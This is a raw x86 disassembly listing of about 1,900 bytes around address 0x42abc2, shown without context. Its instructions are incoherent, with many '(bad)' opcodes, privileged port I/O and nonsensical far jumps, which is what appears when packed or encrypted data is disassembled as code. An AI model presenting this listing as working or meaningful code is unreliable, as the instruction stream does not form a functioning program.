  42abc2:	cmp    ch,BYTE PTR [ecx]
  42abc4:	lock and al,0x60
  42abc7:	out    dx,eax
  42abc8:	aad    0xb4
  42abca:	jl     0x42ab8e
  42abcc:	push   0x2
  42abce:	add    ah,BYTE PTR [eax-0x1851b42]
  42abd4:	add    eax,0x36554d4d
  42abd9:	pop    eax
  42abda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42abdb:	ret    
  42abdc:	xor    al,0x15
  42abde:	test   al,0xe7
  42abe0:	aad    0x6c
  42abe2:	add    eax,0xce2a08a
  42abe7:	in     al,dx
  42abe8:	xchg   esp,eax
  42abe9:	jne    0x42abf0
  42abeb:	cwde   
  42abec:	pop    esp
  42abed:	push   ebp
  42abee:	adc    eax,0x33ac160f
  42abf3:	fs push 0xffffffd8
  42abf6:	ficom  WORD PTR [esi-0x26]
  42abf9:	mov    edx,0x5db82a8a
  42abfe:	xchg   edx,eax
  42abff:	or     al,0x5c
  42ac01:	mov    al,0x4
  42ac03:	pop    ecx
  42ac04:	push   esi
  42ac05:	mov    al,ds:0x8800e0aa
  42ac0a:	pop    edi
  42ac0b:	mov    ds:0xcd763cf2,al
  42ac10:	ror    BYTE PTR [eax+eiz*4],1
  42ac13:	pushf  
  42ac14:	fwait
  42ac15:	stos   BYTE PTR es:[edi],al
  42ac16:	sub    eax,0x76f1d0b6
  42ac1b:	je     0x42abb5
  42ac1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac1e:	imul   edi,DWORD PTR [edx],0x9cfb84f6
  42ac24:	lea    ecx,[edx-0x2fcd85d8]
  42ac2a:	sbb    al,0xa6
  42ac2c:	jl     0x42ac1c
  42ac2e:	es jp  0x42ac2e
  42ac31:	aam    0x7
  42ac33:	sub    al,0x6c
  42ac35:	mov    edi,0x7b1b90f7
  42ac3a:	sbb    al,0x1c
  42ac3c:	fwait
  42ac3d:	sub    bl,BYTE PTR [edx-0x25236883]
  42ac43:	adc    DWORD PTR [edx-0x29a86b00],ebp
  42ac49:	retf   0x64b2
  42ac4c:	add    DWORD PTR [ebp-0x4bc5749a],esi
  42ac52:	xchg   DWORD PTR [esp+edx*1],edx
  42ac55:	repz mov gs,WORD PTR [edx+0x28]
  42ac59:	push   edx
  42ac5a:	mov    cl,0x38
  42ac5c:	add    dl,BYTE PTR [esi]
  42ac5e:	adc    al,0xb0
  42ac60:	je     0x42ac2e
  42ac62:	add    al,0x40
  42ac64:	jbe    0x42ac28
  42ac66:	ins    DWORD PTR es:[edi],dx
  42ac67:	inc    ecx
  42ac68:	jmp    0x42acd4
  42ac6a:	add    ah,BYTE PTR [ebx+0x68]
  42ac6d:	pop    esi
  42ac6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ac6f:	or     edi,esp
  42ac71:	test   BYTE PTR [ebp+0x76],cl
  42ac74:	rol    eax,1
  42ac76:	add    ecx,DWORD PTR [edx]
  42ac78:	sbb    eax,0x84bab554
  42ac7d:	jnp    0x42ace8
  42ac7f:	lea    ecx,[ecx+0x79428a87]
  42ac85:	js     0x42ac27
  42ac87:	stc    
  42ac88:	adc    BYTE PTR [esi-0x2e],0x79
  42ac8c:	call   0x9900:0xa23b48db
  42ac93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ac94:	outs   dx,BYTE PTR ds:[esi]
  42ac95:	sbb    DWORD PTR [eax],esi
  42ac97:	jl     0x42ac1e
  42ac99:	and    al,0x64
  42ac9b:	xor    BYTE PTR [ebx+0x0],bl
  42ac9e:	xchg   ebx,eax
  42ac9f:	sar    DWORD PTR [esi],cl
  42aca1:	dec    edi
  42aca2:	aam    0x47
  42aca4:	je     0x42ac62
  42aca6:	xchg   edi,eax
  42aca7:	sub    BYTE PTR [edx],al
  42aca9:	shl    DWORD PTR [esi],cl
  42acab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42acac:	lods   al,BYTE PTR ds:[esi]
  42acad:	jb     0x42acb9
  42acaf:	dec    ebp
  42acb0:	mov    dl,0x59
  42acb2:	push   cs
  42acb3:	fdivr  st,st(1)
  42acb5:	and    cl,BYTE PTR [eax]
  42acb7:	ins    BYTE PTR es:[edi],dx
  42acb8:	(bad)  
  42acb9:	shl    dh,0xca
  42acbc:	sahf   
  42acbd:	lods   eax,DWORD PTR ds:[esi]
  42acbe:	or     ebx,DWORD PTR [eax-0x2c]
  42acc1:	mov    esi,0x846c36c
  42acc6:	je     0x42ac60
  42acc8:	enter  0x3a14,0x6
  42accc:	push   ds
  42accd:	dec    edx
  42acce:	in     eax,0xce
  42acd0:	clc    
  42acd1:	popf   
  42acd2:	dec    esp
  42acd3:	sub    DWORD PTR [edx+0x54],ebx
  42acd6:	rcr    BYTE PTR [esi-0x4b],1
  42acd9:	mov    ah,0x77
  42acdb:	inc    esp
  42acdc:	ins    DWORD PTR es:[edi],dx
  42acdd:	mov    ch,0xf2
  42acdf:	js     0x42ac61
  42ace1:	pusha  
  42ace2:	mov    al,0x9a
  42ace4:	sub    cl,dh
  42ace6:	not    al
  42ace8:	fcmovbe st,st(0)
  42acea:	loopne 0x42ac90
  42acec:	mov    esp,0xe40a0276
  42acf1:	push   es
  42acf2:	mov    ds:0x7744fe99,eax
  42acf7:	xchg   edx,eax
  42acf8:	add    BYTE PTR [ecx+0x36],dl
  42acfb:	retf   0x9af4
  42acfe:	inc    esi
  42acff:	and    DWORD PTR [eax-0x2],esi
  42ad02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ad03:	hlt    
  42ad04:	dec    esp
  42ad05:	pop    ecx
  42ad06:	add    ah,ah
  42ad08:	rol    DWORD PTR [eax],0xbe
  42ad0b:	xor    BYTE PTR [esi-0x58],ah
  42ad0e:	sub    esp,DWORD PTR [ecx-0x2f]
  42ad11:	adc    esi,edx
  42ad13:	mov    WORD PTR [esp+eiz*2-0x61],ds
  42ad17:	push   0xffffffd7
  42ad19:	jbe    0x42aca3
  42ad1b:	mov    esi,0xbe66c8e4
  42ad20:	fwait
  42ad21:	push   ebx
  42ad22:	iret   
  42ad23:	mov    ecx,0x4fc10108
  42ad28:	dec    eax
  42ad29:	add    al,ah
  42ad2b:	push   ds
  42ad2c:	jb     0x42ad33
  42ad2e:	sub    al,al
  42ad30:	add    DWORD PTR [edx+0x2c4f729e],ebp
  42ad36:	or     DWORD PTR [eax+esi*4-0x7a11c5ff],ebp
  42ad3d:	ret    
  42ad3e:	ror    DWORD PTR [esi+0x46162b2e],0x4a
  42ad45:	mov    esi,0x10c60492
  42ad4a:	ins    BYTE PTR es:[edi],dx
  42ad4b:	(bad)  
  42ad4c:	shr    BYTE PTR [edx+esi*4+0x13f49672],cl
  42ad53:	jo     0x42ad7f
  42ad55:	rcl    DWORD PTR [eax],0x9a
  42ad58:	das    
  42ad59:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ad5b:	inc    ebp
  42ad5c:	add    BYTE PTR [edx+0x748a538c],al
  42ad62:	push   ss
  42ad63:	lock test al,0x15
  42ad66:	inc    esi
  42ad67:	call   0x1a8b:0x514e3914
  42ad6e:	stos   BYTE PTR es:[edi],al
  42ad6f:	adc    al,dl
  42ad71:	mov    ebx,0x6faeaa72
  42ad76:	add    ch,ch
  42ad78:	add    BYTE PTR [ecx+0x5455166b],ch
  42ad7e:	jo     0x42add0
  42ad80:	mov    dl,0xd6
  42ad82:	ins    DWORD PTR es:[edi],dx
  42ad83:	mov    ch,0x86
  42ad85:	or     dl,BYTE PTR [esi]
  42ad87:	loop   0x42ad10
  42ad89:	mov    eax,0x4357b242
  42ad8e:	xchg   ecx,eax
  42ad8f:	sub    eax,0x22d20f32
  42ad94:	inc    esp
  42ad95:	jnp    0x42adcf
  42ad97:	out    dx,eax
  42ad98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ad99:	inc    edx
  42ad9a:	push   ecx
  42ad9b:	inc    ecx
  42ad9c:	inc    ebx
  42ad9d:	pop    ss
  42ad9e:	xchg   edx,eax
  42ad9f:	xchg   eax,ebx
  42ada1:	cmp    eax,0xd8059080
  42ada6:	sbb    cl,BYTE PTR [esp+esi*1+0x16fac9fe]
  42adad:	(bad)  
  42adae:	hlt    
  42adaf:	push   esi
  42adb0:	test   eax,0xb6093ac2
  42adb5:	loopne 0x42ae02
  42adb7:	xchg   BYTE PTR [ebx-0x4b],al
  42adba:	or     dl,BYTE PTR [esi]
  42adbc:	push   ecx
  42adbd:	xchg   esp,eax
  42adbe:	cld    
  42adbf:	jo     0x42ad6c
  42adc1:	and    ah,cl
  42adc3:	or     BYTE PTR [edx+0x2212acaa],0x3a
  42adca:	aad    0xc6
  42adcc:	pop    ss
  42adcd:	shr    DWORD PTR [edx],0xfc
  42add0:	dec    edx
  42add1:	fdivr  DWORD PTR [eax+0x14c4d90e]
  42add7:	int    0x0
  42add9:	push   esi
  42adda:	mov    fs,WORD PTR [esi-0x474b8c87]
  42ade0:	mov    esi,0xa7c49067
  42ade5:	cmp    al,BYTE PTR [eax]
  42ade7:	mov    edi,0x80b5e9f3
  42adec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aded:	add    cl,BYTE PTR [edx]
  42adef:	lods   al,BYTE PTR ds:[esi]
  42adf0:	dec    esi
  42adf1:	mov    bh,0xf7
  42adf3:	mov    dh,0x59
  42adf5:	sti    
  42adf6:	or     ah,bl
  42adf8:	mov    DWORD PTR [eax+edx*8+0x1994ee6b],esi
  42adff:	outs   dx,BYTE PTR ds:[esi]
  42ae00:	sub    BYTE PTR [ebp+0x40],dl
  42ae03:	sbb    eax,0x9cbc6da2
  42ae08:	ins    BYTE PTR es:[edi],dx
  42ae09:	cmp    BYTE PTR [eax-0x65e95e5b],ah
  42ae0f:	cs loop 0x42adf2
  42ae12:	xchg   edx,eax
  42ae13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ae14:	cs ret 0x4036
  42ae18:	jmp    0x99e:0xe24a9ee3
  42ae1f:	fsubr  DWORD PTR [ebx+ebp*2+0x7c]
  42ae23:	add    DWORD PTR [eax],edx
  42ae25:	adc    BYTE PTR [ecx-0x2ebb0548],0x34
  42ae2c:	adc    al,0x54
  42ae2e:	sbb    eax,0x6bd8eaee
  42ae33:	shl    BYTE PTR [esi-0x175505f8],cl
  42ae39:	mov    ch,0x75
  42ae3b:	push   esp
  42ae3c:	jnp    0x42ade4
  42ae3e:	jge    0x42ae5f
  42ae40:	lahf   
  42ae41:	xlat   BYTE PTR ds:[ebx]
  42ae42:	hlt    
  42ae43:	jo     0x42ae62
  42ae45:	add    al,0xaa
  42ae48:	in     al,0x84
  42ae4a:	(bad)  
  42ae4b:	xchg   BYTE PTR ds:0xc163935b,dl
  42ae51:	add    cl,ch
  42ae53:	mov    bl,BYTE PTR [esi]
  42ae55:	add    DWORD PTR [eax],0x312e28d6
  42ae5b:	out    0x4a,eax
  42ae5d:	xchg   edi,eax
  42ae5e:	shl    BYTE PTR [esi+0x58],1
  42ae61:	dec    esp
  42ae62:	pusha  
  42ae63:	xor    edx,DWORD PTR [edx]
  42ae65:	or     ah,BYTE PTR [ebx+0x4c1069a8]
  42ae6b:	pop    esp
  42ae6c:	adc    BYTE PTR [edi+0x68],dl
  42ae6f:	or     DWORD PTR [ecx],ecx
  42ae71:	adc    BYTE PTR [eax],0x12
  42ae74:	cmp    dh,BYTE PTR [eax-0x689ca3fe]
  42ae7a:	adc    BYTE PTR [edx+eiz*1-0xf],bl
  42ae7e:	push   cs
  42ae7f:	or     ah,al
  42ae81:	ror    BYTE PTR [eax],0x40
  42ae84:	lds    edx,FWORD PTR [ebx+eax*2-0x5667c6cc]
  42ae8b:	stos   DWORD PTR es:[edi],eax
  42ae8c:	stos   DWORD PTR es:[edi],eax
  42ae8d:	cdq    
  42ae8e:	inc    edx
  42ae8f:	lea    edi,[ecx+edx*4+0x18959ce6]
  42ae96:	push   ebp
  42ae97:	lods   eax,DWORD PTR ds:[esi]
  42ae98:	cli    
  42ae99:	add    edi,edx
  42ae9b:	arpl   si,ax
  42ae9d:	out    dx,eax
  42ae9e:	loop   0x42aee2
  42aea0:	fld    TBYTE PTR [edx]
  42aea2:	call   0xeb40:0x40e3cb62
  42aea9:	jl     0x42ae84
  42aeab:	jo     0x42aefd
  42aead:	loop   0x42af07
  42aeaf:	shl    BYTE PTR [edi],0xb5
  42aeb2:	and    bl,BYTE PTR [eax+0x10249459]
  42aeb8:	bound  edx,QWORD PTR [ecx]
  42aeba:	add    dh,al
  42aebc:	pushf  
  42aebd:	sub    BYTE PTR [eax],dh
  42aebf:	sbb    edx,DWORD PTR [edi-0x279b50ba]
  42aec5:	mov    al,ds:0xe60d0a5d
  42aeca:	fadd   DWORD PTR [eax+edx*2+0x70864ecf]
  42aed1:	mov    WORD PTR [edx],gs
  42aed3:	test   al,0x40
  42aed5:	adc    eax,DWORD PTR [ebx+eiz*8]
  42aed8:	(bad)  
  42aed9:	mov    ecx,0x5e2a02e1
  42aede:	add    BYTE PTR [ecx+ebp*1+0x0],bl
  42aee2:	xchg   edx,eax
  42aee3:	sub    BYTE PTR [ebx],dh
  42aee5:	out    dx,al
  42aee6:	add    al,0x58
  42aee8:	mov    al,ds:0xf80f84d8
  42aeed:	push   edx
  42aeee:	or     al,0x7a
  42aef0:	je     0x42af20
  42aef2:	or     DWORD PTR [ebp-0x2b],edx
  42aef5:	shl    dl,1
  42aef7:	scas   eax,DWORD PTR es:[edi]
  42aef8:	es jb  0x42aee5
  42aefb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aefc:	ficomp DWORD PTR fs:[esi-0x58a7c92f]
  42af03:	popa   
  42af04:	pop    eax
  42af05:	and    ch,BYTE PTR [esi+0x70442e3d]
  42af0b:	mov    al,0x4e
  42af0d:	shl    DWORD PTR [esi+0x5],0xb4
  42af11:	xchg   ecx,eax
  42af12:	rcr    BYTE PTR [edx],1
  42af14:	push   cs
  42af15:	add    al,0x2f
  42af17:	mov    dh,dl
  42af19:	sub    al,0x96
  42af1b:	add    ebx,DWORD PTR [ecx]
  42af1d:	dec    edx
  42af1e:	mov    dl,0x2
  42af20:	out    dx,al
  42af21:	xchg   ebx,eax
  42af22:	and    ebx,eax
  42af24:	psubsw mm1,QWORD PTR [ebp-0x12]
  42af28:	xchg   esp,eax
  42af29:	add    al,bl
  42af2b:	sbb    eax,0x1a0848a2
  42af30:	push   edi
  42af31:	mov    ebx,0xc4f43620
  42af36:	push   cs
  42af37:	(bad)  
  42af38:	fidivr WORD PTR [edx]
  42af3a:	push   edi
  42af3b:	or     BYTE PTR [ebx-0x7f],al
  42af3e:	nop
  42af3f:	inc    eax
  42af40:	mov    edx,0x9ea99098
  42af45:	push   esp
  42af46:	aad    0xcc
  42af48:	inc    eax
  42af49:	loopne 0x42afaf
  42af4b:	push   ss
  42af4c:	or     eax,0xf516947e
  42af51:	sub    BYTE PTR [edx+0x64cc1366],0xc0
  42af58:	daa    
  42af59:	sub    eax,0xbec5b32a
  42af5e:	addr16 add esi,edi
  42af61:	ror    BYTE PTR [esi],1
  42af63:	lea    edx,[esi+0x2]
  42af66:	fisub  WORD PTR [ecx+eax*2+0x66]
  42af6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42af6b:	push   ss
  42af6c:	stos   BYTE PTR es:[edi],al
  42af6d:	push   esp
  42af6e:	rcl    DWORD PTR [ecx+0x54],1
  42af71:	cmp    al,0x3b
  42af73:	xor    ah,BYTE PTR [ecx-0x6a29c32e]
  42af79:	push   ecx
  42af7a:	pusha  
  42af7b:	pop    eax
  42af7c:	ror    dl,1
  42af7e:	and    DWORD PTR [esi-0x4b],esp
  42af81:	popf   
  42af82:	mov    esp,0x5aa5ef6c
  42af87:	and    BYTE PTR [eax-0x60],bl
  42af8a:	mov    DWORD PTR [ebx-0x490003b8],edx
  42af90:	not    BYTE PTR ds:0x7ca91474
  42af96:	cwde   
  42af97:	test   dh,bl
  42af99:	or     bl,BYTE PTR [esi]
  42af9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42af9c:	fist   WORD PTR [eax+esi*4-0x5d]
  42afa0:	pop    eax
  42afa1:	inc    esp
  42afa2:	add    BYTE PTR [edi+ecx*1+0x5ff44ae2],bl
  42afa9:	add    BYTE PTR [edx],ch
  42afab:	sti    
  42afac:	add    BYTE PTR [esi],cl
  42afae:	ret    
  42afaf:	cmp    ecx,0xffffff83
  42afb2:	dec    ecx
  42afb3:	add    BYTE PTR [esp+ebx*1],bl
  42afb6:	aam    0xab
  42afb8:	mov    WORD PTR [eax],ds
  42afba:	inc    esp
  42afbb:	cmp    DWORD PTR [ecx-0x39],0x5e6cd130
  42afc2:	add    dh,dl
  42afc4:	and    BYTE PTR [ecx+ebp*2-0x6af37521],dh
  42afcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42afcc:	leave  
  42afcd:	mov    al,0x3e
  42afcf:	mov    esp,DWORD PTR [edx]
  42afd1:	(bad)
  42afd4:	shr    BYTE PTR [eax+0x13],cl
  42afd7:	or     bh,dl
  42afd9:	push   0xffffff82
  42afdb:	rcr    esp,1
  42afdd:	or     ebp,eax
  42afdf:	mov    esi,0x6cd4d1d6
  42afe4:	cmp    edx,edx
  42afe6:	xor    al,0x46
  42afe8:	adc    DWORD PTR [eax-0x4dda576a],ecx
  42afee:	sbb    esi,DWORD PTR [esi]
  42aff0:	and    DWORD PTR [ebx+esi*4-0x57149564],eax
  42aff7:	mov    esp,0x2aad002b
  42affc:	add    DWORD PTR [esi-0x1ef6171a],esi
  42b002:	mov    eax,0xc9b0bd0c
  42b007:	dec    ecx
  42b008:	sub    BYTE PTR [edx],dl
  42b00a:	adc    BYTE PTR [esi],ch
  42b00c:	adc    al,0x72
  42b00e:	ror    DWORD PTR [esi+0x4b6605c3],0xfe
  42b015:	push   ds
  42b016:	cs jl  0x42afcd
  42b019:	sub    DWORD PTR [ebp+0x42c225ca],0x5d1bfa5a
  42b023:	test   BYTE PTR [eax+0x352aa3e2],al
  42b029:	das    
  42b02a:	and    dl,BYTE PTR [eax-0x45e9db7a]
  42b030:	push   eax
  42b031:	adc    DWORD PTR [edx+eax*4+0x14aa0bf6],0xf0b3eaae
  42b03c:	les    esi,FWORD PTR [esi-0x58]
  42b03f:	adc    esi,DWORD PTR [eax+0x148a9835]
  42b045:	scas   al,BYTE PTR es:[edi]
  42b046:	push   edx
  42b047:	jmp    DWORD PTR [edx-0x70]
  42b04a:	lds    esp,FWORD PTR ss:[ebx]
  42b04d:	jmp    0x42b05e
  42b04f:	iret   
  42b050:	mov    ds:0x709ad524,al
  42b055:	jb     0x42b008
  42b057:	inc    edi
  42b058:	sub    edi,DWORD PTR [edx-0xdb70150]
  42b05e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b05f:	mov    al,ds:0xf0ded2a2
  42b064:	dec    ebp
  42b065:	popa   
  42b066:	hlt    
  42b067:	sbb    esi,esi
  42b069:	inc    ecx
  42b06a:	sahf   
  42b06b:	arpl   WORD PTR [eax+eax*1+0x611322d4],ax
  42b072:	and    dh,BYTE PTR [eax-0x78]
  42b075:	pop    esp
  42b076:	retf   0x820
  42b079:	mov    dh,0x78
  42b07b:	add    al,0xf5
  42b07d:	pop    es
  42b07e:	nop
  42b07f:	sbb    BYTE PTR [edi],cl
  42b081:	push   0xffffffc3
  42b083:	mov    ds:0x9ede2a0c,eax
  42b088:	pop    eax
  42b089:	(bad)  
  42b08a:	mov    eax,es:0xc28a9a34
  42b090:	adc    BYTE PTR [eax-0xa52efe6],ah
  42b096:	and    al,0xd0
  42b098:	test   BYTE PTR [edx],0x27
  42b09b:	xchg   esi,eax
  42b09c:	add    al,0xba
  42b09e:	inc    eax
  42b09f:	inc    eax
  42b0a0:	mov    al,ds:0x2868aad2
  42b0a5:	pushf  
  42b0a6:	push   edx
  42b0a7:	mov    edx,edx
  42b0a9:	call   0xb06f:0x86f9
  42b0af:	add    al,0x50
  42b0b1:	les    eax,FWORD PTR [edx+0x165e4a00]
  42b0b7:	inc    ebx
  42b0b8:	or     BYTE PTR [eax],ch
  42b0ba:	aam    0xa
  42b0bc:	int3   
  42b0bd:	stos   BYTE PTR es:[edi],al
  42b0be:	jbe    0x42b0dd
  42b0c0:	push   0x2a
  42b0c2:	and    BYTE PTR [ecx+edi*4],dl
  42b0c5:	in     al,0x50
  42b0c7:	popf   
  42b0c8:	js     0x42b136
  42b0ca:	mov    al,ds:0x54a87699
  42b0cf:	sub    ax,0x5806
  42b0d3:	mov    esi,0x682c0024
  42b0d8:	push   cs
  42b0d9:	in     al,dx
  42b0da:	or     dl,BYTE PTR [ecx-0x27195aac]
  42b0e0:	aad    0xd1
  42b0e2:	push   ds
  42b0e3:	sub    al,0xaf
  42b0e5:	or     ch,BYTE PTR [ecx]
  42b0e7:	adc    ah,BYTE PTR [edx+edx*4-0x54b73f8c]
  42b0ee:	mov    esi,0x5808108e
  42b0f3:	adc    cl,BYTE PTR [esi+esi*4]
  42b0f6:	or     DWORD PTR [ebx],0x6df8f68a
  42b0fc:	test   eax,0x3c0a104c
  42b101:	js     0x42b167
  42b103:	clc    
  42b104:	add    eax,0xd68d2161
  42b109:	inc    eax
  42b10a:	mov    ch,0xb6
  42b10c:	pop    ss
  42b10d:	sbb    al,0x58
  42b10f:	pop    eax
  42b110:	es push ebp
  42b112:	dec    eax
  42b113:	into   
  42b114:	mov    ch,0x30
  42b116:	retf   
  42b117:	pop    ss
  42b118:	add    BYTE PTR [edx-0x683d60e3],ch
  42b11e:	xchg   esp,eax
  42b11f:	inc    ch
  42b121:	dec    eax
  42b122:	(bad)  
  42b123:	or     eax,eax
  42b125:	mov    ebx,0xf2448961
  42b12a:	and    al,0x54
  42b12c:	add    bl,ah
  42b12e:	daa    
  42b12f:	imul   ebp,DWORD PTR [ebx-0x50],0xf
  42b133:	inc    esi
  42b134:	sbb    al,dl
  42b136:	and    bl,BYTE PTR [esi]
  42b138:	ror    eax,0x30
  42b13b:	lock pop ebx
  42b13d:	rcr    DWORD PTR [ecx],1
  42b13f:	cmp    BYTE PTR [edi+ebp*1-0x72],al
  42b143:	mov    ebp,0x25f900
  42b148:	fs (bad) 
  42b14a:	pop    ebx
  42b14b:	mov    ch,0x61
  42b14d:	or     BYTE PTR [esp+ebx*8+0x5009670],bl
  42b154:	data16 scas al,BYTE PTR es:[edi]
  42b156:	or     BYTE PTR [edi+edx*1+0x76e9059c],dh
  42b15d:	ins    DWORD PTR es:[edi],dx
  42b15e:	mov    BYTE PTR [ebx+edi*1+0x1e3a0eb2],ch
  42b165:	pop    es
  42b166:	mov    edx,0x949d84dd
  42b16b:	mov    DWORD PTR [eax+0x1a4042c3],eax
  42b171:	sbb    al,0x1d
  42b173:	ins    DWORD PTR es:[edi],dx
  42b174:	cmp    DWORD PTR [edx+ebx*8-0x33d72593],0xffffffcc
  42b17c:	cmp    esp,esp
  42b17e:	aas    
  42b17f:	inc    eax
  42b180:	sub    BYTE PTR [edx],dl
  42b182:	sub    ch,BYTE PTR [eax+0x3d3d0]
  42b188:	push   0x5
  42b18a:	inc    edi
  42b18b:	ret    0x1f47
  42b18e:	test   BYTE PTR [esi+eax*8-0x34],ch
  42b192:	rol    BYTE PTR [edx],1
  42b194:	push   edx
  42b195:	clc    
  42b196:	sub    DWORD PTR [eax+esi*1-0x7b79786f],ebp
  42b19d:	scas   eax,DWORD PTR es:[edi]
  42b19e:	xchg   ebx,eax
  42b19f:	sub    BYTE PTR [edx-0x18],0x78
  42b1a3:	add    ah,al
  42b1a5:	inc    edi
  42b1a6:	adc    dl,BYTE PTR [edx+0x43]
  42b1a9:	inc    ebp
  42b1aa:	mov    DWORD PTR [esi-0x2a230a00],0x8b4a43b0
  42b1b4:	cmp    al,ah
  42b1b6:	push   ds
  42b1b7:	push   es
  42b1b8:	xor    al,0xd4
  42b1ba:	scas   al,BYTE PTR es:[edi]
  42b1bb:	add    al,0xa2
  42b1bd:	test   eax,0x896a7dab
  42b1c2:	xor    al,0x7a
  42b1c4:	sahf   
  42b1c5:	rcl    DWORD PTR [eax],0x1
  42b1c8:	xchg   DWORD PTR [edx-0x7e],ecx
  42b1cb:	loop   0x42b15b
  42b1cd:	xlat   BYTE PTR ds:[ebx]
  42b1ce:	pop    esi
  42b1cf:	out    dx,al
  42b1d0:	scas   al,BYTE PTR es:[edi]
  42b1d1:	sub    dl,ch
  42b1d3:	or     al,0x60
  42b1d5:	xchg   DWORD PTR [eax],ebx
  42b1d7:	mov    dh,0x76
  42b1d9:	mov    BYTE PTR [ecx+0xa6a8856],ah
  42b1df:	repz jo 0x42b1e8
  42b1e2:	dec    ebp
  42b1e3:	imul   eax,DWORD PTR ds:0x208856cd,0x942fcb64
  42b1ed:	mov    ss,WORD PTR [eax-0x7fe1d67c]
  42b1f3:	adc    eax,0xd0ebda0d
  42b1f8:	popa   
  42b1f9:	cs inc esi
  42b1fb:	and    WORD PTR [edx+0x64],bx
  42b1ff:	mov    ebx,0x52abf1ce
  42b204:	stos   BYTE PTR es:[edi],al
  42b205:	leave  
  42b206:	ret    0xabb6
  42b209:	push   ebp
  42b20a:	pop    eax
  42b20b:	test   esi,esi
  42b20d:	out    dx,eax
  42b20e:	mov    esi,0x3e94fda6
  42b213:	push   ss
  42b214:	pusha  
  42b215:	test   DWORD PTR [eax+0x1e],esi
  42b218:	mov    dh,0x60
  42b21a:	or     cl,BYTE PTR [esi+0x56]
  42b21d:	(bad)  [eax+ebp*4-0xb251378]
  42b224:	pop    edx
  42b225:	xchg   BYTE PTR [edx*2-0x18a34c93],bl
  42b22c:	loope  0x42b1ec
  42b22e:	jae    0x42b208
  42b230:	sbb    ah,BYTE PTR [eax-0x4e]
  42b233:	jbe    0x42b269
  42b235:	add    eax,esi
  42b237:	mov    eax,0xa5b3cc7f
  42b23c:	sub    al,0x60
  42b23e:	xor    DWORD PTR [eax-0x8],0xfffffff0
  42b242:	ins    DWORD PTR es:[edi],dx
  42b243:	cs retf 0x213a
  42b247:	jnp    0x42b2a5
  42b249:	jno    0x42b2c4
  42b24b:	push   0xffffff8c
  42b24d:	ret    
  42b24e:	dec    esp
  42b24f:	or     BYTE PTR ds:0x87a8aa4e,0x9c
  42b256:	and    DWORD PTR ds:[esi+eiz*2+0x3b],0xf380b5da
  42b25f:	in     al,0xf3
  42b261:	push   edx
  42b262:	loopne 0x42b224
  42b264:	pop    edi
  42b265:	mov    al,0xc0
  42b267:	add    dl,BYTE PTR ds:0xa25ed664
  42b26d:	test   DWORD PTR [eax+0x45],eax
  42b270:	adc    eax,0x656a59f6
  42b275:	test   DWORD PTR [eax+0x6892cfca],0xa6e6d335
  42b27f:	xor    DWORD PTR [edx-0x50],ebp
  42b282:	add    BYTE PTR [edi],ch
  42b284:	mov    eax,0xf55e289f
  42b289:	sbb    DWORD PTR [esi],esi
  42b28b:	push   esp
  42b28c:	adc    eax,0xbcc03cd4
  42b291:	pop    esp
  42b292:	and    esi,ebp
  42b294:	in     al,dx
  42b295:	adc    DWORD PTR [ecx],0x26
  42b298:	mov    al,ds:0xbeccc86a
  42b29d:	mov    WORD PTR [eax],cs
  42b29f:	and    ebp,DWORD PTR [ebx+0x53]
  42b2a2:	(bad)  
  42b2a4:	push   0x17
  42b2a6:	int3   
  42b2a7:	neg    BYTE PTR [ebx-0x40]
  42b2aa:	or     bh,BYTE PTR [eax+edi*8]
  42b2ad:	jl     0x42b2f3
  42b2af:	(bad)  
  42b2b0:	icebp  
  42b2b1:	or     ch,BYTE PTR [edi-0x53]
  42b2b4:	xor    al,BYTE PTR [edx+0x76]
  42b2b7:	js     0x42b24e
  42b2b9:	sub    eax,0x78e8a578
  42b2be:	shr    BYTE PTR [edx],0x91
  42b2c1:	adc    al,BYTE PTR [eax+esi*1+0x2b]
  42b2c5:	and    cl,BYTE PTR [ebx]
  42b2c7:	lods   eax,DWORD PTR ds:[esi]
  42b2c8:	in     eax,dx
  42b2c9:	push   ss
  42b2ca:	xchg   bh,ch
  42b2cc:	mov    ds:0xa7fac26a,eax
  42b2d1:	pop    es
  42b2d2:	add    dh,BYTE PTR [esi]
  42b2d4:	pop    esp
  42b2d5:	push   eax
  42b2d6:	mov    dh,0x2c
  42b2d8:	add    DWORD PTR [eax],edi
  42b2da:	in     al,dx
  42b2db:	xchg   edi,eax
  42b2dc:	rol    BYTE PTR [ebx-0x5f],cl
  42b2df:	ins    DWORD PTR es:[edi],dx
  42b2e0:	xchg   esp,eax
  42b2e1:	out    dx,al
  42b2e2:	stos   BYTE PTR es:[edi],al
  42b2e3:	inc    eax
  42b2e4:	inc    ebx
  42b2e5:	inc    esp
  42b2e6:	ins    BYTE PTR es:[edi],dx
  42b2e7:	iret   
  42b2e8:	mov    WORD PTR [ecx+esi*4+0x46],es
  42b2ec:	cmp    dl,ch
  42b2ee:	in     eax,dx
  42b2ef:	push   es
  42b2f0:	and    eax,ebx
  42b2f2:	pusha  
  42b2f3:	cmp    ecx,DWORD PTR [esi+0x45]
  42b2f6:	in     al,0xb8
  42b2f8:	aam    0x2
  42b2fa:	mov    bl,0x3c
  42b2fc:	in     al,0xea
  42b2fe:	fcom   st(0)
  42b300:	shr    BYTE PTR [esi],0x38
  42b303:	mov    cl,0x32
  42b305:	xchg   esi,eax
  42b306:	mov    ebx,0xa1a06da
  42b30b:	push   eax
  42b30c:	adc    al,0xc2
  42b30e:	(bad)  
  42b30f:	jae    0x42b373
  42b311:	into   
  42b312:	push   esi
  42b313:	cmp    eax,0x82ec2808
  42b318:	mov    al,ds:0x5be84865
  42b31d:	adc    DWORD PTR [eax-0x590ff570],edi
  42b323:	inc    eax
